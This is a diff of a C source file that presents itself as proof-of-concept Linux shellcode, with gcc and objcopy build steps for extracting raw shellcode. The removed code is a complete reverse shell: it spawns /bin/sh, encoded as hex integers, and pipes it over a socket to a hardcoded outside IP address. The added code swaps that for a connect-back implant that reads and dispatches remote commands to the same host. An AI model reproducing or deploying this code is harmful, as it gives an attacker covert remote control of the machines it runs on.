@@ -26,10 +26,10 @@
   STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
   ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
   POSSIBILITY OF SUCH DAMAGE. */
-  
+
 /**
   This is only a PoC to demonstrate writing shellcode for Linux in C
-  
+
   gcc -N -O0 -fno-stack-protector -nostdlib tls.c -fpic -o tls
   objcopy -O binary --only-section=.text tls tls.bin
 
@@ -39,113 +39,83 @@
 #define REMOTE_PORT 4082
 #define REMOTE_HOST 0x0F932A105 // 5.161.50.249
 
-//void main(void) {
-void _start(void) {  
-      struct sockaddr_in sa;
-      int                i, r, s, len, efd; 
-      int                fd, in[2], out[2];
-      char               buf[BUFSIZ];
-      struct epoll_event evts;
-      char               *args[2];
-      pid_t              pid;
-      int                str[8];
+void _start(void)
+{
+  struct sockaddr_in sa;
+  int i, r;
+  char buf[BUFSIZ];
+  struct pollfd evts[1];
+  data_t data;
 
-      // init_api(&ds);
-      
-      // create pipes for redirection of stdin/stdout/stderr
-      _pipe(in);
-      _pipe(out);
+  data.command_len = 0;
+  data.shell_mode = 0;
 
-      pid = _fork();
+  // create a socket
+  data.s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
 
-      // if child process
-      if (pid == 0) {
-        // assign read end to stdin
-        _dup2(in[0],  STDIN_FILENO);
-        // assign write end to stdout   
-        _dup2(out[1], STDOUT_FILENO);
-        // assign write end to stderr  
-        _dup2(out[1], STDERR_FILENO);  
-        
-        // close pipes
-        _close(in[0]);  _close(in[1]);
-        _close(out[0]); _close(out[1]);
-        
-        // execute shell
-        // /bin/sh
-        str[0] = 0x6e69622f;
-        str[1] = 0x0068732f;
-        args[0] = (char*)str;
-        args[1] = NULL;
-        _execve(args[0], args, NULL);
-      } else {
-        // close read and write ends
-        _close(in[0]); _close(out[1]);
+  sa.sin_family = AF_INET;
+  sa.sin_port = htons(REMOTE_PORT);
 
-        // create a socket
-        s = _socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
-        
-        sa.sin_family = AF_INET;
-        sa.sin_port   = _htons(REMOTE_PORT);
-        
-        // connect to remote host
-        sa.sin_addr.s_addr = REMOTE_HOST;
-      
-        r = _connect(s, (struct sockaddr*)&sa, sizeof(sa));
-        
+  // connect to remote host
+  sa.sin_addr.s_addr = REMOTE_HOST;
 
-        if(r >= 0) {
-          // open an epoll file descriptor
-          efd = _epoll_create1(0);
-    
-          // add 2 descriptors to monitor stdout and socket
-          for (i=0; i<2; i++) {
-            fd = (i==0) ? s : out[0];
-            evts.data.fd = fd;
-            evts.events  = EPOLLIN;
-        
-            _epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
-          }
-          
-          // now loop until user exits or some other error
-          for (;;) {
-            r = _epoll_wait(efd, &evts, 1, -1);
-          
-            // error? bail out           
-            if (r < 0) break;
-          
-            // not input? bail out
-            if (!(evts.events & EPOLLIN)) break;
+  r = connect(data.s, (struct sockaddr *)&sa, sizeof(sa));
 
-            fd = evts.data.fd;
+  if (r >= 0)
+  {
+    char current[]="./";
+    //PRINT_TEXT(STDOUT_FILENO, "Server started!\n");
+    PRINT_TEXT(data.s, "Server started!\n> ");
+    //uname_command(&data);
+    //ls_command(&data, current);
 
-            if(fd == s)
-            {
-              // read from socket and write to stdin
-              len = _read(s, buf, BUFSIZ);
-              if(!len) break;
+    evts[0].fd = data.s;
+    evts[0].events = POLLIN;
 
-              _write(in[1], buf, len);
-            } else
-            {
-              // read from stdout and write to socket
-              len = _read(out[0], buf, BUFSIZ);
-              if(!len) break;
+    // now loop until user exits or some other error
+    for (;;)
+    {
+      r = poll(evts, 1, 1000);
 
-              _write(s, buf, len);
-            }      
-          }
-        
-          _epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);
-          _epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);
-          _close(efd);
-        }
-        // shutdown socket
-        _shutdown(s, SHUT_RDWR);
-        _close(s);
+      // error? bail out
+      if (r < 0)
+      {
+        PRINT_TEXT(STDERR_FILENO, "poll() failed!\n");
+        break;
       }
-      // terminate shell      
-      _kill(pid, SIGCHLD);
-      _close(in[1]);
-      _close(out[0]);
+
+      // read from socket and write to stdin
+      r = read(data.s, buf, BUFSIZ);
+      if (!r)
+        break;
+
+      // write(in[1], buf, len);
+      if (!data.shell_mode)
+      {
+        for (i = 0; i < r; i++)
+        {
+          if (buf[i] == '\n')
+          {
+            data.command[data.command_len] = 0;
+            process_command(&data);
+            continue;
+          }
+          data.command[data.command_len++] = buf[i];
+        }
+
+        if (data.command_len == 0)
+        {
+          PRINT_TEXT(data.s, "> ");
+        }
+      }
+    }
+  }
+  //else
+   // PRINT_TEXT(STDERR_FILENO, "connect() failed!\n");
+
+  // shutdown socket
+  shutdown(data.s, SHUT_RDWR);
+  close(data.s);
+
+  exit(0);
 }
